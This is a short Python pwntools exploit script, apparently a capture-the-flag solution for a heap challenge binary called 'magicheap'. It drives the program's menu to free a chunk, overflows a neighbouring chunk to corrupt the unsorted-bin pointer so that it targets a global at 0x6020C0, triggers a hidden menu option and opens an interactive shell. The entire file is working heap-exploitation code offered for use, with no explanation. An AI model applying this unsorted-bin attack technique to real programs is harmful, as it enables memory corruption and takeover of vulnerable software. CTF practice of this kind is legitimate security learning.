from pwn import *

r = process('./magicheap')

def create_heap(size, content):
    r.recvuntil(":")
    r.sendline("1")
    r.recvuntil(":")
    r.sendline(str(size))
    r.recvuntil(":")
    r.sendline(content)


def edit_heap(idx, size, content):
    r.recvuntil(":")
    r.sendline("2")
    r.recvuntil(":")
    r.sendline(str(idx))
    r.recvuntil(":")
    r.sendline(str(size))
    r.recvuntil(":")
    r.sendline(content)


def del_heap(idx):
    r.recvuntil(":")
    r.sendline("3")
    r.recvuntil(":")
    r.sendline(str(idx))

create_heap(0x10,'AAAAAAAA')
create_heap(0x90,'AAAAAAAA')
create_heap(0x10,'AAAAAAAA')
del_heap(1)

payload = p64(0x0)*3 + p64(0xa1) + p64(0x0) + p64(0x6020C0 - 0x10)
edit_heap(0,len(payload)+1,payload)

create_heap(0x90,p64(0x1305))

sleep(0.1)
r.sendline('4869')

r.interactive()
